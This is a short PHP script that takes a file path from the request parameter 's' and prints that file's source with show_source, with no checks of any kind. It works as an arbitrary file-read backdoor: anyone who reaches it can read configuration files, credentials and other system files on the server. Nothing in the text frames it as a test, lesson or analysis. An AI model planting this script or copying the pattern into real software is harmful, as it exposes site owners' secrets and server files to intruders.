<?php
$PATH = (isset($_REQUEST['s']) ? $_REQUEST['s'] : '');
if(empty($PATH)) die('Cannot locate the path');
show_source($PATH);
